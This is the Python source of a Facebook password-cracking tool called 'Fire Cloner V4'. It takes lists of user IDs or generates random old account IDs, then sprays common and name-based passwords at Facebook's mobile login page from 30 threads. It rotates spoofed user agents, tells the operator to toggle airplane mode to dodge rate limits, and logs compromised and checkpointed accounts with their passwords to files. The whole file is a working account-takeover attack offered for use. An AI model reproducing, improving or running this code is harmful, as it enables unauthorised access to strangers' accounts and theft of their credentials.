# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------
# AUTHOR: CHARSI ON FIRE
# GITHUB: GITHUB.COM/CHARSI-PRO
# VERSION: 4.0 (PREMIUM NO-LOGIN EDITION)
# -----------------------------------------------------------------------

from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
import os, sys, time, re, json, requests, random, subprocess

# --- Color Codes ---
P = '\x1b[1;97m' # WHITE
M = '\x1b[1;91m' # RED
H = '\x1b[1;92m' # GREEN
K = '\x1b[1;93m' # YELLOW
B = '\x1b[1;94m' # BLUE
N = '\x1b[0m'    # RESET

# --- Global Storage ---
loop = 0
ok = []
cp = []
id = []

# --- Premium User Agents (Hacking Methods) ---
# These UAs mimic old browsers and specific mobile devices for better hits
ugen = []
for _ in range(10000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='K'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uastring=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uastring)

def clear():
    os.system('clear')

def banner():
    banner_text = """
  ██████╗██╗  ██╗ █████╗ ██████╗ ███████╗██╗
 ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔════╝██║
 ██║     ███████║███████║██████╔╝███████╗██║
 ██║     ██╔══██║██╔══██║██╔══██╗╚════██║██║
 ╚██████╗██║  ██║██║  ██║██║  ██║███████║██║
  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝
    """
    sol().print(nel(banner_text, style="cyan", title="FIRE CLONER V4"))
    info = "[bold white]AUTHOR   : CHARSI ON FIRE\nGITHUB   : CHARSI-PRO\nVERSION  : 4.0 (GLOBAL NO-LOGIN)[/]"
    cetak(nel(info, style="green"))

# --- Main Menu ---
class menu:
    def main(self):
        clear()
        banner()
        print(f" {H}[01]{P} File Cloning (Fast Method)")
        print(f" {H}[02]{P} Random Old ID Cloning (2006-2014)")
        print(f" {H}[03]{P} Check OK/CP Results")
        print(f" {H}[04]{P} Contact Developer")
        print(f" {H}[00]{P} Exit")
        print("-" * 50)
        
        choice = input(f" {H}[+]{P} Choice : ")
        if choice in ['1', '01']:
            self.file_cloning()
        elif choice in ['2', '02']:
            self.random_cloning()
        elif choice in ['3', '03']:
            self.results()
        elif choice in ['4', '04']:
            subprocess.check_output(["am", "start", "https://wa.me/923110760985"])
        else:
            exit()

    def file_cloning(self):
        clear()
        banner()
        print(f" {K}[*] Example: /sdcard/filename.txt")
        file = input(f" {H}[+]{P} Enter File Path : ")
        try:
            for line in open(file, 'r').readlines():
                id.append(line.strip())
            self.start_crack()
        except FileNotFoundError:
            print(f" {M}[!] File not found!"); time.sleep(2); self.main()

    def random_cloning(self):
        clear()
        banner()
        print(f" {K}[*] Old ID Series (2006-2014)")
        limit = int(input(f" {H}[+]{P} How many IDs : "))
        for _ in range(limit):
            # UIDs belonging to 2006-2014 range
            prefix = random.choice(['100000', '1000000', '10000', '5000'])
            uid = prefix + str(random.randint(11111, 9999999))
            id.append(uid + "<=>Old_Account")
        self.start_crack()

    def results(self):
        print(f" {H}[01]{P} Check OK IDs")
        print(f" {H}[02]{P} Check CP IDs")
        c = input(f" {H}[+]{P} Choice : ")
        if c == '1':
            os.system('cat OK.txt')
        else:
            os.system('cat CP.txt')
        input("\nPress Enter...")
        self.main()

    def start_crack(self):
        clear()
        banner()
        print(f" {H}[√]{P} Total IDs : {H}{len(id)}")
        print(f" {K}[*]{P} Select Password Method:")
        print(f" [1] Auto Password (Fast)")
        print(f" [2] Manual Password (Specific)")
        m = input(f" {H}[+]{P} Choice : ")
        
        print("-" * 50)
        print(f" {H}[!] Starting Crack... Use Airplane Mode Every 5 Mins")
        print("-" * 50)
        
        if m == '2':
            pw_manual = input(f" {H}[+]{P} Enter Passwords (comma separated) : ").split(',')
            with tred(max_workers=30) as pool:
                for user in id:
                    uid = user.split('<=>')[0]
                    pool.submit(self.crack_engine, uid, pw_manual)
        else:
            with tred(max_workers=30) as pool:
                for user in id:
                    try:
                        uid, name = user.split('<=>')
                        first = name.split(' ')[0].lower()
                        # Dynamic list based on best hacking patterns
                        if len(first) < 3:
                            pass_list = [name.lower(), '786786', 'pakistan', 'khan123']
                        else:
                            pass_list = [name.lower(), first+'123', first+'1234', first+'12345', '786786', 'khan123', 'khan786']
                        pool.submit(self.crack_engine, uid, pass_list)
                    except: pass
        
        print(f"\n{H}[√] Crack Completed. OK: {len(ok)}")
        input("Press Enter...")
        self.main()

    def crack_engine(self, uid, pass_list):
        global loop, ok, cp
        sys.stdout.write(f"\r {P}[CHARSI] {loop}/{len(id)} {H}OK:{len(ok)} {K}CP:{len(cp)} "); sys.stdout.flush()
        
        for pw in pass_list:
            try:
                ua = random.choice(ugen)
                session = requests.Session()
                # Requesting login data
                free_fb = session.get("https://mbasic.facebook.com/login.php").text
                data = {
                    "lsd": re.search('name="lsd" value="(.*?)"', free_fb).group(1),
                    "jazoest": re.search('name="jazoest" value="(.*?)"', free_fb).group(1),
                    "email": uid,
                    "pass": pw,
                    "login": "Log In"
                }
                
                # Posting Login Request
                # 
                res = session.post("https://mbasic.facebook.com/login.php", data=data, headers={"user-agent": ua})
                
                if "c_user" in session.cookies.get_dict():
                    print(f"\r {H}[FIRE-OK] {uid} | {pw}{N}")
                    ok.append(uid)
                    open("OK.txt", "a").write(f"{uid}|{pw}\n")
                    break
                elif "checkpoint" in session.cookies.get_dict():
                    cp.append(uid)
                    open("CP.txt", "a").write(f"{uid}|{pw}\n")
                    break
            except:
                pass
        loop += 1

if __name__ == "__main__":
    menu().main()
